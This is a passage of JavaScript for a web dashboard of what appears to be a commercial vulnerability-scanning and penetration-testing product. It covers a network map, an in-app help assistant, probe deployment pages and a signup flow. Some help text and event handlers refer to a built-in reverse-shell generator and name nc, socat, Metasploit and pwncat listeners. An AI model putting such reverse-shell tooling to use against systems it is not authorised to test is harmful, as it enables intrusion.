          ${hit.cves.length ? `<div style="font-size:12px;color:var(--text-2);margin-top:6px">CVEs:<br><code style="font-size:11px;color:var(--warning)">${hit.cves.slice(0,3).join(', ')}</code></div>` : ''}
          <button class="btn btn-ghost btn-sm" style="width:100%;margin-top:14px" onclick="drilldownHost('${esc(hit.id)}')">View Findings →</button>`;
      }
      drawTopo(canvas);
    }
  };

  canvas.onwheel = (e) => {
    e.preventDefault();
    const factor = e.deltaY < 0 ? 1.1 : 0.9;
    TOPO.scale = Math.max(0.3, Math.min(3, TOPO.scale * factor));
    drawTopo(canvas);
  };

  document.getElementById('topoResetBtn')?.addEventListener('click', () => {
    TOPO.scale = 1; TOPO.panX = 0; TOPO.panY = 0;
    TOPO.selectedNode = null;
    drawTopo(canvas);
    if (detail) detail.style.display = 'none';
  });
}

// ══════════════════════════════════════════════════════════════
//  REMEDIATION ROI (injected into AI Intel)
// ══════════════════════════════════════════════════════════════

// IBM Cost of Data Breach 2024: avg $4.88M
const IBM_BREACH_COST = 4880000;

function computeROI(finding) {
  const severityWeight = [0, 0.02, 0.08, 0.22, 0.45];
  const weight = severityWeight[Math.min(finding.severity, 4)] || 0;
  const effortHours = finding.severity >= 3 ? 2 : finding.severity === 2 ? 8 : 20;
  const riskReduction = Math.round(weight * IBM_BREACH_COST / 1000);
  const rph = Math.round(riskReduction / effortHours);
  return { riskReduction, effortHours, rph };
}

// ══════════════════════════════════════════════════════════════
//  XAREX AI ASSISTANT
// ══════════════════════════════════════════════════════════════

const ASSISTANT_STATE = {
  open:        false,
  history:     [],  // [{role, content}]
  typing:      false,
  currentPage: 'dashboard',
};

const QUICK_ACTIONS = {
  dashboard:      ['What do these stats mean?', 'How do I start my first scan?', 'Why is my breach probability high?', 'What does risk trend show?'],
  scans:          ['How do I configure a scan?', 'What do scan statuses mean?', 'How do I watch a scan live?', 'Why isn\'t my scan starting?'],
  findings:       ['How do I prioritise findings?', 'What does CVSS score mean?', 'How do I add analyst notes?', 'What are MITRE ATT&CK techniques?'],
  'attack-paths': ['How do attack paths work?', 'How do I break a kill chain?', 'What is the risk score?', 'What\'s the entry point?'],
  probes:         ['How do I deploy a probe?', 'My probe isn\'t connecting', 'Do I need root access?', 'Can I have multiple probes?'],
  reports:        ['How do I generate a report?', 'What\'s in the executive summary?', 'How does AI analysis work?', 'What are quick wins?'],
  schedules:      ['How do I write a cron expression?', 'How often should I scan?', 'What\'s "Run Now" for?', 'Can I disable a schedule temporarily?'],
  intelligence:   ['How does the AI analysis work?', 'What is an attack narrative?', 'What does risk score mean?', 'What\'s the remediation ROI?'],
  hosts:          ['How is host risk score calculated?', 'What does the ring chart mean?', 'How do I filter by host?', 'What are the MITRE techniques?'],
  diff:           ['What does risk delta mean?', 'How do I track remediation?', 'What shows in the Fixed tab?', 'What are persisting findings?'],
  tools:          ['How does the CVSS calculator work?', 'How do I generate a reverse shell?', 'How do I decode a JWT?', 'What is CIDR notation?'],
  threats:        ['How does threat simulation work?', 'What is my exposure score?', 'Which APT groups target my sector?', 'What is MITRE ATT&CK?'],
  crownjewels:    ['What are crown jewels?', 'How is blast radius calculated?', 'What does Direct Paths mean?', 'How do I reduce blast radius?'],
  cvewatch:       ['How do CVE alerts work?', 'What does YOUR ENV mean?', 'What is a PoC flag?', 'Why did the fetch fail?'],
  topology:       ['How do I read the network map?', 'What do red arrows mean?', 'How do I zoom in?', 'What does node colour mean?'],
  settings:       ['Where is my API key?', 'How do I change the Brain URL?', 'How do I set ANTHROPIC_API_KEY?', 'Why am I getting 401 errors?'],
};

function toggleAssistant() {
  ASSISTANT_STATE.open = !ASSISTANT_STATE.open;
  const panel = document.getElementById('aiPanel');
  if (panel) panel.classList.toggle('open', ASSISTANT_STATE.open);

  if (ASSISTANT_STATE.open) {
    updateAssistantContext(ASSISTANT_STATE.currentPage);
    setTimeout(() => document.getElementById('aiInput')?.focus(), 300);
  }
}

function updateAssistantContext(page) {
  ASSISTANT_STATE.currentPage = page;
  const badge = document.getElementById('aiContextBadge');
  const titles = {
    dashboard:'Dashboard', scans:'Scans', findings:'Findings',
    'attack-paths':'Attack Paths', probes:'Probes', reports:'Reports',
    schedules:'Schedules', intelligence:'AI Intel', settings:'Settings',
    hosts:'Host Inventory', diff:'Scan Diff', tools:'Pentest Tools',
    threats:'Threat Actors', crownjewels:'Crown Jewels',
    cvewatch:'CVE Watch', topology:'Network Map',
  };
  if (badge) badge.textContent = titles[page] || page;
  renderQuickActions(page);
}

function renderQuickActions(page) {
  const wrap = document.getElementById('aiQuickActions');
  if (!wrap) return;
  const actions = QUICK_ACTIONS[page] || QUICK_ACTIONS.dashboard;
  wrap.innerHTML = actions.map(a =>
    `<button class="ai-quick-chip" onclick="sendAssistantMessage(${JSON.stringify(a)})">${esc(a)}</button>`
  ).join('');
}

// Simple markdown → HTML (bold, inline code, bullet lists, line breaks)
function renderMD(text) {
  return text
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
    .replace(/`([^`]+)`/g, '<code>$1</code>')
    .replace(/^[-•] (.+)$/gm, '<li>$1</li>')
    .replace(/(<li>.*<\/li>(\n|$))+/g, m => `<ul>${m}</ul>`)
    .replace(/\n/g, '<br>');
}

function appendMessage(role, content) {
  const messages = document.getElementById('aiMessages');
  if (!messages) return;

  const div = document.createElement('div');
  div.className = `ai-msg ai-msg-${role}`;

  const bubble = document.createElement('div');
  bubble.className = 'ai-msg-bubble';
  bubble.innerHTML = role === 'assistant' ? renderMD(content) : esc(content);
  div.appendChild(bubble);
  messages.appendChild(div);
  messages.scrollTop = messages.scrollHeight;
}

function showTypingIndicator() {
  const messages = document.getElementById('aiMessages');
  if (!messages) return;
  const div = document.createElement('div');
  div.className = 'ai-msg ai-msg-assistant';
  div.id = 'aiTypingIndicator';
  div.innerHTML = `<div class="ai-typing">
    <div class="ai-typing-dot"></div>
    <div class="ai-typing-dot"></div>
    <div class="ai-typing-dot"></div>
  </div>`;
  messages.appendChild(div);
  messages.scrollTop = messages.scrollHeight;
}

function hideTypingIndicator() {
  document.getElementById('aiTypingIndicator')?.remove();
}

async function sendAssistantMessage(presetMsg) {
  const input = document.getElementById('aiInput');
  const btn   = document.getElementById('aiSendBtn');
  const msg   = (presetMsg || input?.value || '').trim();
  if (!msg || ASSISTANT_STATE.typing) return;

  if (input && !presetMsg) input.value = '';

  // Show user message
  appendMessage('user', msg);

  // Show typing
  ASSISTANT_STATE.typing = true;
  if (btn) btn.disabled = true;
  showTypingIndicator();

  // Build context
  const context = {
    page:           ASSISTANT_STATE.currentPage,
    scan_count:     STATE.scans.length,
    probe_count:    STATE.probes.filter(p => p.status === 'online').length,
    finding_count:  STATE.findings.length,
    critical_count: STATE.findings.filter(f => f.severity === 4).length,
  };

  try {
    const response = await api('/api/v1/assistant/chat', {
      method: 'POST',
      body: JSON.stringify({ message: msg, context, history: ASSISTANT_STATE.history.slice(-10) }),
    });

    hideTypingIndicator();
    const reply = response.reply || 'Sorry, I couldn\'t generate a response.';

    // Update powered-by indicator
    const powered = document.getElementById('aiPoweredBy');
    if (powered) {
      powered.textContent = response.powered_by === 'claude' ? '✦ Powered by Claude' : '⚙ Rules Engine';
      powered.style.color = response.powered_by === 'claude' ? '#7c6af7' : 'var(--text-3)';
    }

    appendMessage('assistant', reply);

    // Store in history
    ASSISTANT_STATE.history.push({ role: 'user', content: msg });
    ASSISTANT_STATE.history.push({ role: 'assistant', content: reply });
    if (ASSISTANT_STATE.history.length > 40) ASSISTANT_STATE.history.splice(0, 2);

  } catch(e) {
    hideTypingIndicator();
    // Fallback: local rules
    const fallback = _localAssistantFallback(msg);
    appendMessage('assistant', fallback);
  } finally {
    ASSISTANT_STATE.typing = false;
    if (btn) btn.disabled = false;
  }
}

// Local client-side fallback when backend is unreachable
function _localAssistantFallback(msg) {
  const ml = msg.toLowerCase();
  const rules = {
    'scan':         '**To start a scan:** Scans → + New Scan → enter name + subnet (e.g. `192.168.1.0/24`) → Launch. Use Quick Scan on the Dashboard for instant launch.',
    'probe':        '**To deploy a probe:** Probes → Deploy Probe → follow the 3-step guide. Run: `sudo ./xarex-probe --brain-url https://xarex.com --api-key YOUR_KEY`',
    'finding':      '**Findings:** Click any row for full detail — CVE, CVSS score, MITRE techniques, compliance tags, resource links, analyst notes.',
    'crown':        '**Crown Jewels:** Define critical assets (DC, payment DB). Xarex counts attack paths leading to each one and shows blast radius + estimated breach cost.',
    'cve':          '**CVE Watch:** Fetches NIST NVD in real-time. Click Refresh Feed. Red "YOUR ENV" = matches your services. Orange "PoC" = public exploit exists.',
    'threat':       '**Threat Actors:** Select an APT group → see exposure score (0-10), matched findings, and simulated kill chain.',
    'report':       '**Reports:** Reports → select scan → Generate Report. Claude Opus if API key set, rules engine otherwise. Full analysis in AI Intel.',
    'attack path':  '**Attack Paths:** Shows kill chains. Fix the entry point finding to break the entire chain — you don\'t need to fix every hop.',
    'cvss':         '**CVSS v3.1:** 0=None, 0.1–3.9=Low, 4–6.9=Medium, 7–8.9=High, 9–10=Critical. Use the CVSS Calculator in Pentest Tools.',
    'schedule':     '**Schedules:** + New Schedule → enter cron (e.g. `0 2 * * *` = 2am daily) + subnet + probe. Run Now triggers immediately.',
    'network map':  '**Network Map:** Drag to pan, scroll to zoom, click nodes for detail. Red arrows = attack paths. Node colour = risk level.',
    'jwt':          '**JWT Decoder:** Pentest Tools → JWT tab → paste token. Inspect header (alg, typ) and payload (claims, exp, iss). Watch for `alg: none`.',
    'reverse shell':'**Reverse Shell:** Pentest Tools → Rev Shell tab → enter IP/port → pick language. Listener commands for nc, socat, MSF, pwncat shown below.',
    'cidr':         '**CIDR Calculator:** Pentest Tools → CIDR tab → enter subnet like `192.168.1.0/24`. Get network, broadcast, host range, total hosts.',
    'diff':         '**Scan Diff:** Select baseline + target scan → Compare. New tab = regressions. Fixed tab = wins. Negative risk delta = you improved.',
    'host':         '**Host Inventory:** Per-host risk cards. Ring colour = risk level. Click card → View Findings to drill into that host\'s vulnerabilities.',
  };
  for (const [kw, reply] of Object.entries(rules)) {
    if (ml.includes(kw)) return reply;
  }
  return '**Xarex AI** — I can help with any feature. Try asking about: scanning, findings, attack paths, crown jewels, CVE watch, threat actors, reports, schedules, or pentest tools.';
}

// ── Deploy Probe page ─────────────────────────────────────────

function refreshDeployProbePage() {
  // The Deploy Probe page is end-user documentation — always show the
  // production Cloud Brain URL, never the local dashboard's API URL.
  const url      = PRODUCTION_URL;
  const grpcAddr = PRODUCTION_GRPC;
  const orgId    = STATE.orgId || 'loading…';

  // Fill credential cards
  setText('deployOrgId',    orgId);
  setText('deployBrainUrl', url);

  // API key display — masked by default
  const dispEl = document.getElementById('deployApiKeyDisplay');
  if (dispEl && !dispEl._revealed) dispEl.textContent = '••••••••••••••••';

  // Fill per-method config vars (Linux / Docker / Windows quick start)
  setDeployVar('linux-conf-org',    orgId);
  setDeployVar('linux-conf-brain',  grpcAddr);
  setDeployVar('docker-conf-org',   orgId);
  setDeployVar('docker-conf-brain', grpcAddr);
  setDeployVar('win-conf-org',      orgId);
  setDeployVar('win-conf-brain',    grpcAddr);

  // Fill download URL placeholders
  const linuxDl = url + '/download/xarex-probe-linux';
  const winDl   = url + '/download/xarex-probe-windows.exe';
  const dlLinux = document.getElementById('dl-linux-url');
  const dlWin   = document.getElementById('dl-win-url');
  if (dlLinux) dlLinux.textContent = linuxDl;
  if (dlWin)   dlWin.textContent   = winDl;

  // Probe connection status banner
  updateDeployProbeStatus();

  // If org_id wasn't loaded yet, fetch it now and re-render once it lands.
  if (!STATE.orgId) {
    loadOrgIdentity().then(() => {
      if (STATE.orgId) refreshDeployProbePage();
    });
  }
}

function setDeployVar(id, value) {
  const el = document.getElementById(id);
  if (el) el.textContent = value;
}

async function updateDeployProbeStatus() {
  const banner = document.getElementById('deployProbeStatus');
  const text   = document.getElementById('deployProbeStatusText');
  if (!banner || !text) return;
  try {
    const probes  = STATE.probes.length ? STATE.probes : await api('/api/v1/probes').catch(() => []);
    const online  = probes.filter(p => p.status === 'online');
    if (online.length > 0) {
      banner.className = 'probe-status-banner connected';
      text.textContent = `${online.length} probe${online.length > 1 ? 's' : ''} connected and ready — ${online.map(p => p.probe_id || p.id).join(', ')}`;
    } else {
      banner.className = 'probe-status-banner waiting';
      text.textContent = 'Waiting for probe connection… Deploy a probe below and it will appear here within 30 seconds.';
    }
  } catch {
    banner.className = 'probe-status-banner waiting';
    text.textContent = 'Waiting for probe connection…';
  }
}

function toggleDeployApiKey() {
  const dispEl   = document.getElementById('deployApiKeyDisplay');
  const btnEl    = document.getElementById('deployApiKeyToggle');
  if (!dispEl) return;
  if (dispEl._revealed) {
    dispEl.textContent = '••••••••••••••••';
    dispEl._revealed   = false;
    if (btnEl) btnEl.textContent = '👁';
  } else {
    dispEl.textContent = STATE.apiKey || '—';
    dispEl._revealed   = true;
    if (btnEl) btnEl.textContent = '🙈';
  }
}

function switchDeployMethod(method) {
  document.querySelectorAll('.deploy-method-tab').forEach(t => {
    t.classList.toggle('active', t.dataset.method === method);
  });
  document.querySelectorAll('.deploy-method-panel').forEach(p => {
    p.classList.toggle('active', p.id === `deploy-method-${method}`);
  });
}

function copyDeployCode(elemId, btn) {
  const el = document.getElementById(elemId);
  if (!el) return;
  const text = el.innerText || el.textContent;
  copyText(text);
  if (btn) {
    const orig = btn.innerHTML;
    btn.innerHTML = '✓ Copied';
    btn.classList.add('copied');
    setTimeout(() => { btn.innerHTML = orig; btn.classList.remove('copied'); }, 2000);
  }
}

function copyText(text) {
  if (!text || text === '—') return;
  navigator.clipboard.writeText(text).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
  });
}

// ── Init ──────────────────────────────────────────────────────

document.addEventListener('DOMContentLoaded', () => {

  // Route to landing page or app based on stored API key
  if (!STATE.apiKey) {
    // Show landing page
    showLandingPage();

    // Connect modal button
    const connectBtn = document.getElementById('connectBtn');
    const connectKey = document.getElementById('connectKey');
    if (connectBtn) connectBtn.addEventListener('click', connectFromModal);
    if (connectKey) connectKey.addEventListener('keydown', e => { if (e.key === 'Enter') connectFromModal(); });

    // Legacy setup overlay (keep for compatibility — hidden by default)
    document.getElementById('setupConnectBtn')?.addEventListener('click', setupConnect);
    document.getElementById('setupKey')?.addEventListener('keydown', e => { if (e.key === 'Enter') setupConnect(); });
  } else {
    // Has API key — show app directly
    document.getElementById('landingPage').style.display  = 'none';
    document.getElementById('connectModal').style.display = 'none';
    launchApp();
  }

  // Section nav — sidebar items navigate to section default page
  document.querySelectorAll('.nav-section[data-section]').forEach(item => {
    item.addEventListener('click', e => {
      e.preventDefault();
      if (window.innerWidth <= 768) closeMobileSidebar();
      const sec = item.dataset.section;
      const cfg = SECTIONS[sec];
      navigateTo(cfg ? cfg.defaultPage : sec);
    });
  });

  // Sidebar collapse (desktop) / overlay (mobile)
  document.getElementById('sidebarToggle')?.addEventListener('click', () => {
    if (window.innerWidth <= 768) {
      toggleMobileSidebar();
    } else {
      document.getElementById('sidebar').classList.toggle('collapsed');
    }
  });

  // Ops Console controls
  initOpsConsole();

  // Quick scan toggle
  document.getElementById('quickScanBtn')?.addEventListener('click', () => {
    const bar = document.getElementById('quickScanBar');
    bar.style.display = bar.style.display === 'none' ? 'flex' : 'none';
    if (bar.style.display === 'flex') document.getElementById('qsScanName')?.focus();
  });
  document.getElementById('quickScanSubmitBtn')?.addEventListener('click', quickScan);
  document.getElementById('qsSubnet')?.addEventListener('keydown', e => { if (e.key==='Enter') quickScan(); });

  // New scan buttons (dashboard + scans page)
  document.getElementById('newScanBtn')?.addEventListener('click',  () => { populateProbeSelect(STATE.probes); loadTemplatesIntoSelect(); openModal('newScanModal'); });
  document.getElementById('newScanBtn2')?.addEventListener('click', () => { populateProbeSelect(STATE.probes); loadTemplatesIntoSelect(); openModal('newScanModal'); });
  document.getElementById('submitNewScan')?.addEventListener('click', submitNewScan);
  document.getElementById('cancelNewScan')?.addEventListener('click', closeModal);
  document.getElementById('closeNewScan')?.addEventListener('click',  closeModal);

  // Finding modal
  document.getElementById('closeFinding')?.addEventListener('click',  closeModal);
  document.getElementById('closeFinding2')?.addEventListener('click', closeModal);

  // Modal overlay click-outside
  document.getElementById('modalOverlay').addEventListener('click', e => {
    if (e.target === document.getElementById('modalOverlay')) closeModal();
  });

  // Findings filters
  document.getElementById('severityFilter')?.addEventListener('change', e => {
    loadFindings(document.getElementById('scanFilter').value || undefined, e.target.value || undefined, document.getElementById('hostFilter').value || undefined);
  });
  document.getElementById('scanFilter')?.addEventListener('change', e => {
    loadFindings(e.target.value || undefined, document.getElementById('severityFilter').value || undefined, document.getElementById('hostFilter').value || undefined);
  });
  document.getElementById('hostFilter')?.addEventListener('input', e => {
    const scanId = document.getElementById('scanFilter').value || undefined;
    const sev    = document.getElementById('severityFilter').value || undefined;
    loadFindings(scanId, sev, e.target.value.trim() || undefined);
  });

  // Export buttons
  document.getElementById('exportCSVBtn')?.addEventListener('click',  () => exportFindings('csv'));
  document.getElementById('exportJSONBtn')?.addEventListener('click', () => exportFindings('json'));

  // Attack paths
  document.getElementById('apScanFilter')?.addEventListener('change', e => { if(e.target.value) loadAttackPaths(e.target.value); });
  document.getElementById('rebuildPathsBtn')?.addEventListener('click', rebuildAttackPaths);

  // Reports
  document.getElementById('genReportBtn')?.addEventListener('click', async () => {
    const scanId = document.getElementById('scanFilter')?.value || STATE.scans[0]?.id;
    if (!scanId) return showError('No scan selected. Go to Findings and pick a scan first.');
    await generateReport(scanId);
    navigateTo('reports');
  });

  // Schedules
  document.getElementById('newScheduleBtn')?.addEventListener('click', () => {
    populateProbeSelect(STATE.probes); openModal('newScheduleModal');
  });
  document.getElementById('submitNewSchedule')?.addEventListener('click', submitNewSchedule);
  document.getElementById('cancelNewSchedule')?.addEventListener('click', closeModal);
  document.getElementById('closeNewSchedule')?.addEventListener('click',  closeModal);

  // AI Intel
  document.getElementById('runAIBtn')?.addEventListener('click', runAIAnalysis);
  document.getElementById('lookupCVEBtn')?.addEventListener('click', lookupCVE);
  document.getElementById('cveInput')?.addEventListener('keydown', e => { if(e.key==='Enter') lookupCVE(); });

  // Hosts page
  document.getElementById('hostScanFilter')?.addEventListener('change', e => loadHosts(e.target.value));
  document.getElementById('hostSearch')?.addEventListener('input', () => { if (STATE._allHosts) renderHostsGrid(STATE._allHosts); });

  // Scan Diff
  document.getElementById('runDiffBtn')?.addEventListener('click', runScanDiff);
  document.querySelectorAll('.diff-tab').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.diff-tab').forEach(t => t.classList.remove('active'));
      btn.classList.add('active');
      renderDiffTab(btn.dataset.tab);
    });
  });

  // Tools tabs
  document.querySelectorAll('.tools-tab').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.tools-tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('active'));
      btn.classList.add('active');
      document.getElementById(`tool-${btn.dataset.tool}`)?.classList.add('active');
    });
  });

  // CVSS calculator
  document.querySelectorAll('.cvss-btns').forEach(group => {
    group.querySelectorAll('.cvss-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        group.querySelectorAll('.cvss-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        CVSS_STATE[group.dataset.metric] = btn.dataset.val;
        updateCVSSDisplay();
      });
    });
  });
  document.getElementById('copyCVSSBtn')?.addEventListener('click', () => copyElementText('cvssVector'));

  // Rev shell live update
  document.getElementById('rsPort')?.addEventListener('input', genRevShell);
  document.getElementById('rsIP')?.addEventListener('input', genRevShell);
  document.getElementById('rsType')?.addEventListener('change', genRevShell);

  // CIDR enter key
  document.getElementById('cidrInput')?.addEventListener('keydown', e => { if (e.key === 'Enter') calcCIDR(); });

  // JWT auto-decode on paste/input
  document.getElementById('jwtInput')?.addEventListener('input', decodeJWT);

  // Settings save
  document.getElementById('saveSettingsBtn')?.addEventListener('click', async () => {
    const url = document.getElementById('settingsBrainUrl').value.trim().replace(/\/$/, '');
    const key = document.getElementById('settingsApiKey').value.trim();
    if (!key) return showError('API key cannot be empty.');
    STATE.brainUrl = url;
    STATE.apiKey   = key;
    localStorage.setItem('xarex_brain_url', url);
    localStorage.setItem('xarex_api_key',   key);
    await connect();
    if (STATE.connected) addEvent('probe', 'Settings saved & reconnected');
  });

  // Topology scan filter
  document.getElementById('topoScanFilter')?.addEventListener('change', e => loadTopologyMap(e.target.value));

  // CVE window filter
  document.getElementById('cveWindowFilter')?.addEventListener('change', loadCVEWatch);

  // AI assistant — Enter key to send
  document.getElementById('aiInput')?.addEventListener('keydown', e => {
    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendAssistantMessage(); }
  });

  // Initial quick actions for dashboard
  renderQuickActions('dashboard');
});

/* ═══════════════════════════════════════════════════════════════
   XAREX — Feature Additions 2026
   Scan Modules · Guide Panel · Report Types · Deploy Install Tabs
   ═══════════════════════════════════════════════════════════════ */

/* ── Scan Module Toggle ─────────────────────────────────────── */
function toggleScanModule(el) {
  el.classList.toggle('smt-checked');
  const check = el.querySelector('.smt-check');
  if (el.classList.contains('smt-checked')) {
    check.textContent = '✓';
  } else {
    check.textContent = '';
  }
}

function getSelectedModules() {
  const modules = [];
  document.querySelectorAll('.scan-module-toggle.smt-checked').forEach(el => {
    if (el.dataset.module) modules.push(el.dataset.module);
  });
  return modules;
}

/* ── Guide Panel ─────────────────────────────────────────────── */
function openGuide(section) {
  const overlay = document.getElementById('guideOverlay');
  if (!overlay) return;
  overlay.classList.add('guide-open');
  if (section) showGuide(section, document.querySelector(`[data-guide="${section}"]`));
}

function closeGuide() {
  const overlay = document.getElementById('guideOverlay');
  if (overlay) overlay.classList.remove('guide-open');
}

function showGuide(id, tocItem) {
  // Update TOC active state
  document.querySelectorAll('.guide-toc-item').forEach(i => i.classList.remove('guide-active'));
  if (tocItem) tocItem.classList.add('guide-active');
  // Show correct article
  document.querySelectorAll('.guide-article').forEach(a => a.classList.remove('guide-active'));
  const article = document.getElementById('guide-' + id);
  if (article) article.classList.add('guide-active');
}

// ESC to close guide
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') closeGuide();
});

/* ── Report Type Selector ───────────────────────────────────── */
let currentReportType = 'executive';

function setReportType(tab) {
  document.querySelectorAll('.report-template-tab').forEach(t => t.classList.remove('rt-active'));
  tab.classList.add('rt-active');
  currentReportType = tab.dataset.rtype || 'executive';
  const badge = document.getElementById('reportTypeBadge');
  const labels = { executive: 'Executive Format', technical: 'Technical Format', compliance: 'Compliance Format' };
  if (badge) badge.textContent = labels[currentReportType] || 'Executive Format';
}

/* ── Deploy Persistent Install Tabs ────────────────────────── */
function switchInstallTab(tab) {
  document.querySelectorAll('.deploy-install-tab').forEach(t => t.classList.remove('active'));
  tab.classList.add('active');
  const method = tab.dataset.install;
  document.querySelectorAll('.deploy-install-panel').forEach(p => p.classList.remove('active'));
  const panel = document.getElementById(`install-panel-${method}`);
  if (panel) panel.classList.add('active');
}

/* ── Export Buttons ─────────────────────────────────────────── */
document.getElementById('reportExportPDFBtn')?.addEventListener('click', () => {
  const reportId = document.querySelector('#reportsBody tr.selected')?.dataset?.id;
  if (!reportId) return (showToast?.('Select a report row first.', 'warn') || alert('Select a report row first.'));
  window.location.href = `${STATE.brainUrl}/api/v1/reports/${reportId}/pdf?api_key=${encodeURIComponent(STATE.apiKey)}`;
});

document.getElementById('reportExportHTMLBtn')?.addEventListener('click', () => {
  const reportId = document.querySelector('#reportsBody tr.selected')?.dataset?.id;
  if (!reportId) return (showToast?.('Select a report row first.', 'warn') || alert('Select a report row first.'));
  window.open(`${STATE.brainUrl}/api/reports/${reportId}/html`, '_blank');
});

document.getElementById('reportExportMDBtn')?.addEventListener('click', () => {
  const reportId = document.querySelector('#reportsBody tr.selected')?.dataset?.id;
  if (!reportId) return (showToast?.('Select a report row first.', 'warn') || alert('Select a report row first.'));
  window.open(`${STATE.brainUrl}/api/reports/${reportId}/markdown`, '_blank');
});

/* ── Report scan filter ─────────────────────────────────────── */
document.getElementById('reportScanFilter')?.addEventListener('change', e => {
  // re-load reports filtered by scan
  if (typeof loadReports === 'function') loadReports(e.target.value);
});

/* ── Populate report scan filter when scans load ─────────────── */
const _origLoadScans = typeof loadScans === 'function' ? loadScans : null;

/* ── Auto-populate persistent-install credential fields ────── */
function updateDeployCredFields() {
  const orgId = STATE.orgId || 'loading…';
  // Always show production endpoints — this page is customer-facing docs.
  const host = PRODUCTION_URL.replace(/^https?:\/\//, '').replace(/\/$/, '');
  const fields = {
    'sd-conf-org':    orgId,
    'sd-conf-brain':  PRODUCTION_GRPC,
    'dc-conf-org2':   orgId,
    'dc-conf-brain2': PRODUCTION_GRPC,
    'verify-brain':   host,
    'upgrade-url':    `${PRODUCTION_URL}/download/xarex-probe-linux`,
  };
  for (const [id, val] of Object.entries(fields)) {
    const el = document.getElementById(id);
    if (el) el.textContent = val;
  }
}

// Hook into navigation to update deploy fields when Deploy Probe page is visited
const _origNavigateTo = typeof navigateTo === 'function' ? navigateTo : null;
if (_origNavigateTo) {
  window.navigateTo = function(page) {
    _origNavigateTo(page);
    if (page === 'deploy-probe') {
      try { updateDeployCredFields(); } catch(e) {}
    }
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// Checkout Modal
// ─────────────────────────────────────────────────────────────────────────────

let _checkoutPlan    = 'free';    // 'free' | 'starter' | 'pro'
let _checkoutCadence = 'annual';  // 'monthly' | 'annual'
let _checkoutFreeApiKey = '';
let _checkoutFreeOrgId  = '';

function showCheckoutModal() {
  const modal = document.getElementById('checkoutModal');
  if (!modal) return;
  _showCheckoutStep('step0');
  document.getElementById('checkoutName').value  = '';
  document.getElementById('checkoutEmail').value = '';
  document.getElementById('checkoutError').style.display = 'none';
  modal.style.display = 'flex';
}

function hideCheckoutModal() {
  const modal = document.getElementById('checkoutModal');
  if (modal) modal.style.display = 'none';
}

function _showCheckoutStep(step) {
  ['checkoutStep0','checkoutStep1','checkoutStep2','checkoutStep3'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.style.display = (id === step) ? '' : 'none';
  });
}

function selectPlan(plan) {
  _checkoutPlan = plan;
  // Show step 1 (contact details)
  _showCheckoutStep('checkoutStep1');
  if (plan === 'free') {
    document.getElementById('checkoutStepTitle').textContent = 'Create your free account';
    document.getElementById('checkoutStepSub').textContent   = 'No credit card required';
    document.getElementById('checkoutFreeBtn').style.display  = '';
    document.getElementById('checkoutProBtns').style.display  = 'none';
    const tog = document.getElementById('checkoutCadenceToggle');
    if (tog) tog.style.display = 'none';
  } else {
    const label = plan === 'pro' ? 'Xarex Pro' : 'Xarex Starter';
    document.getElementById('checkoutStepTitle').textContent = 'Start your free trial';
    document.getElementById('checkoutFreeBtn').style.display  = 'none';
    document.getElementById('checkoutProBtns').style.display  = '';
    // Show cadence toggle and update subtitle
    const tog = document.getElementById('checkoutCadenceToggle');
    if (tog) tog.style.display = '';
    _updateCadenceSubtitle(label);
  }
}

function _updateCadenceSubtitle(label) {
  const sub = document.getElementById('checkoutStepSub');
  if (!sub) return;
  const cadenceLabel = _checkoutCadence === 'annual' ? 'Annual (2 months free)' : 'Monthly';
  if (label) {
    sub.textContent = label + ' · ' + cadenceLabel + ' · 14-day free trial';
  } else {
    sub.textContent = cadenceLabel + ' · 14-day free trial';
  }
}

function setCheckoutCadence(cadence) {
  _checkoutCadence = cadence;
  // Update toggle button visual states via inline style
  const btnMonthly = document.getElementById('cadenceBtnMonthly');
  const btnAnnual  = document.getElementById('cadenceBtnAnnual');
  const activeStyle   = 'background:rgba(124,106,247,0.2);color:#a89df5;';
  const inactiveStyle = 'background:transparent;color:#6b6080;';
  if (btnMonthly) btnMonthly.setAttribute('style', btnMonthly.getAttribute('style').replace(/background:[^;]+;color:[^;]+;/, '') + (cadence === 'monthly' ? activeStyle : inactiveStyle));
  if (btnAnnual)  btnAnnual.setAttribute('style',  btnAnnual.getAttribute('style').replace(/background:[^;]+;color:[^;]+;/, '')  + (cadence === 'annual'  ? activeStyle : inactiveStyle));
  const label = _checkoutPlan === 'pro' ? 'Xarex Pro' : 'Xarex Starter';
  _updateCadenceSubtitle(label);
}

function goToPlanPicker() {
  _showCheckoutStep('checkoutStep0');
  document.getElementById('checkoutError').style.display = 'none';
}

function _validateContactFields() {
  const name  = document.getElementById('checkoutName').value.trim();
  const email = document.getElementById('checkoutEmail').value.trim();
  const errEl = document.getElementById('checkoutError');
  errEl.style.display = 'none';
  if (!name) {
    errEl.textContent = 'Please enter your name.';
    errEl.style.display = '';
    return null;
  }
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    errEl.textContent = 'Please enter a valid email address.';
    errEl.style.display = '';
    return null;
  }
  return { name, email };
}

async function startFreeSignup() {
  const fields = _validateContactFields();
  if (!fields) return;
  const { name, email } = fields;

  _showCheckoutStep('checkoutStep2');
  document.getElementById('checkoutSpinnerIcon').textContent = '⏳';
  document.getElementById('checkoutSpinnerMsg').textContent  = 'Creating your account…';

  const base = (STATE.brainUrl || window.location.origin).replace(/\/$/, '');

  try {
    const resp = await fetch(`${base}/api/billing/signup/free`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, name }),
    });

    const data = await resp.json().catch(() => ({}));
    if (!resp.ok) throw new Error(data.detail || `Server error ${resp.status}`);

    _checkoutFreeApiKey = data.api_key;
    _checkoutFreeOrgId  = data.org_id;

    // Show success step
    document.getElementById('checkoutSuccessEmail').textContent = email;
